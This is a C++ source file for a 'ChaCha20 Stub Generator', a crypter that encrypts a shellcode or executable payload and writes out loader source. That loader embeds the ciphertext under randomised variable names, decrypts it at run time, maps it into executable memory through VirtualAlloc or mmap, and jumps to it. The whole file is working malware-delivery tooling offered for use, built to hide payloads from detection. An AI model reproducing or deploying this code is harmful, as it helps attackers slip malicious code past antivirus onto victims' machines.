#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <iomanip>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <ctime>

// ChaCha20 implementation for encryption
inline void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

void chachaBlock(uint32_t output[16], const uint32_t input[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) {
        x[i] = input[i];
    }
    
    for (int i = 0; i < 10; i++) {
        quarterRound(x[0], x[4], x[8], x[12]);
        quarterRound(x[1], x[5], x[9], x[13]);
        quarterRound(x[2], x[6], x[10], x[14]);
        quarterRound(x[3], x[7], x[11], x[15]);
        
        quarterRound(x[0], x[5], x[10], x[15]);
        quarterRound(x[1], x[6], x[11], x[12]);
        quarterRound(x[2], x[7], x[8], x[13]);
        quarterRound(x[3], x[4], x[9], x[14]);
    }
    
    for (int i = 0; i < 16; i++) {
        output[i] = x[i] + input[i];
    }
}

void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;
    
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[4*i]) |
                       ((uint32_t)key[4*i + 1] << 8) |
                       ((uint32_t)key[4*i + 2] << 16) |
                       ((uint32_t)key[4*i + 3] << 24);
    }
    
    state[12] = counter;
    
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[4*i]) |
                        ((uint32_t)nonce[4*i + 1] << 8) |
                        ((uint32_t)nonce[4*i + 2] << 16) |
                        ((uint32_t)nonce[4*i + 3] << 24);
    }
}

void chacha20Crypt(const uint8_t* input, uint8_t* output, size_t length,
                   const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    uint32_t state[16];
    uint32_t keystream[16];
    uint8_t* keystream_bytes = (uint8_t*)keystream;
    
    size_t processed = 0;
    while (processed < length) {
        initChachaState(state, key, nonce, counter);
        chachaBlock(keystream, state);
        
        size_t blockSize = (length - processed < 64) ? length - processed : 64;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream_bytes[i];
        }
        
        processed += blockSize;
        counter++;
    }
}

static uint32_t simpleSeed = 0;
inline uint32_t simpleRand() {
    simpleSeed = (simpleSeed * 1103515245 + 12345) & 0x7fffffff;
    return simpleSeed;
}

std::string generateRandomString(int length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string result;
    result.reserve(length);
    
    for (int i = 0; i < length; i++) {
        result += charset[simpleRand() % (sizeof(charset) - 1)];
    }
    
    return result;
}

std::string toHexString(const uint8_t* data, size_t len) {
    std::stringstream ss;
    for (size_t i = 0; i < len; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)data[i];
    }
    return ss.str();
}

void generateChaChaStub(const std::string& payloadFile, const std::string& outputFile, 
                        const uint8_t* key, const uint8_t* nonce) {
    
    // Read payload
    std::ifstream fin(payloadFile, std::ios::binary);
    if (!fin) {
        std::cerr << "Failed to open payload file: " << payloadFile << std::endl;
        return;
    }
    
    fin.seekg(0, std::ios::end);
    size_t fileSize = fin.tellg();
    fin.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> payload(fileSize);
    fin.read(reinterpret_cast<char*>(payload.data()), fileSize);
    fin.close();
    
    // Encrypt payload
    std::vector<uint8_t> encryptedPayload(fileSize);
    chacha20Crypt(payload.data(), encryptedPayload.data(), fileSize, key, nonce, 0);
    
    // Generate stub code
    std::ofstream fout(outputFile);
    if (!fout) {
        std::cerr << "Failed to create output file: " << outputFile << std::endl;
        return;
    }
    
    // Random variable names
    std::string keyVar = "KEY_" + generateRandomString(8);
    std::string nonceVar = "NONCE_" + generateRandomString(8);
    std::string payloadVar = "PAYLOAD_" + generateRandomString(8);
    
    fout << R"(#include <iostream>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <cstdint>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

// Embedded key and nonce
const std::string )" << keyVar << R"( = ")" << toHexString(key, 32) << R"(";
const std::string )" << nonceVar << R"( = ")" << toHexString(nonce, 12) << R"(";

// Embedded encrypted payload
const unsigned char )" << payloadVar << R"([] = {
    )";
    
    // Write encrypted payload as hex array
    for (size_t i = 0; i < encryptedPayload.size(); i++) {
        if (i % 16 == 0 && i > 0) fout << "\n    ";
        fout << "0x" << std::hex << std::setw(2) << std::setfill('0') 
             << (int)encryptedPayload[i];
        if (i < encryptedPayload.size() - 1) fout << ", ";
    }
    
    fout << R"(
};

// ChaCha20 implementation
inline void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

void chachaBlock(uint32_t output[16], const uint32_t input[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) {
        x[i] = input[i];
    }
    
    for (int i = 0; i < 10; i++) {
        quarterRound(x[0], x[4], x[8], x[12]);
        quarterRound(x[1], x[5], x[9], x[13]);
        quarterRound(x[2], x[6], x[10], x[14]);
        quarterRound(x[3], x[7], x[11], x[15]);
        
        quarterRound(x[0], x[5], x[10], x[15]);
        quarterRound(x[1], x[6], x[11], x[12]);
        quarterRound(x[2], x[7], x[8], x[13]);
        quarterRound(x[3], x[4], x[9], x[14]);
    }
    
    for (int i = 0; i < 16; i++) {
        output[i] = x[i] + input[i];
    }
}

void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;
    
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[4*i]) |
                       ((uint32_t)key[4*i + 1] << 8) |
                       ((uint32_t)key[4*i + 2] << 16) |
                       ((uint32_t)key[4*i + 3] << 24);
    }
    
    state[12] = counter;
    
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[4*i]) |
                        ((uint32_t)nonce[4*i + 1] << 8) |
                        ((uint32_t)nonce[4*i + 2] << 16) |
                        ((uint32_t)nonce[4*i + 3] << 24);
    }
}

void chacha20Decrypt(const uint8_t* input, uint8_t* output, size_t length,
                     const uint8_t key[32], const uint8_t nonce[12]) {
    uint32_t state[16];
    uint32_t keystream[16];
    uint8_t* keystream_bytes = (uint8_t*)keystream;
    uint32_t counter = 0;
    
    size_t processed = 0;
    while (processed < length) {
        initChachaState(state, key, nonce, counter);
        chachaBlock(keystream, state);
        
        size_t blockSize = (length - processed < 64) ? length - processed : 64;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream_bytes[i];
        }
        
        processed += blockSize;
        counter++;
    }
}

uint8_t hexCharToInt(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

void hexStringToBytes(const std::string& hex, uint8_t* bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        bytes[i] = (hexCharToInt(hex[2*i]) << 4) | hexCharToInt(hex[2*i + 1]);
    }
}

int main() {
    // Convert hex strings to bytes
    uint8_t key[32];
    uint8_t nonce[12];
    
    hexStringToBytes()" << keyVar << R"(, key, 32);
    hexStringToBytes()" << nonceVar << R"(, nonce, 12);
    
    // Decrypt payload
    size_t payloadSize = sizeof()" << payloadVar << R"();
    std::vector<uint8_t> decrypted(payloadSize);
    
    chacha20Decrypt()" << payloadVar << R"(, decrypted.data(), payloadSize, key, nonce);
    
    // Execute decrypted payload
#ifdef _WIN32
    void* exec = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, decrypted.data(), payloadSize);
        ((void(*)())exec)();
    }
#else
    void* exec = mmap(NULL, payloadSize, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec != MAP_FAILED) {
        memcpy(exec, decrypted.data(), payloadSize);
        ((void(*)())exec)();
    }
#endif
    
    return 0;
}
)";
    
    fout.close();
    std::cout << "ChaCha20 stub generated: " << outputFile << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "=== ChaCha20 Stub Generator ===" << std::endl;
        std::cout << "Usage: " << argv[0] << " <payload_file> <output_stub.cpp>" << std::endl;
        std::cout << "Examples:" << std::endl;
        std::cout << "  " << argv[0] << " shellcode.bin chacha_stub.cpp" << std::endl;
        std::cout << "  " << argv[0] << " payload.exe stub_output.cpp" << std::endl;
        return 1;
    }
    
    simpleSeed = static_cast<uint32_t>(time(nullptr));
    
    // Generate random key and nonce
    uint8_t key[32];
    uint8_t nonce[12];
    
    for (int i = 0; i < 32; i++) {
        key[i] = simpleRand() & 0xFF;
    }
    
    for (int i = 0; i < 12; i++) {
        nonce[i] = simpleRand() & 0xFF;
    }
    
    std::cout << "Generating ChaCha20 stub with random key and nonce..." << std::endl;
    generateChaChaStub(argv[1], argv[2], key, nonce);
    
    return 0;
}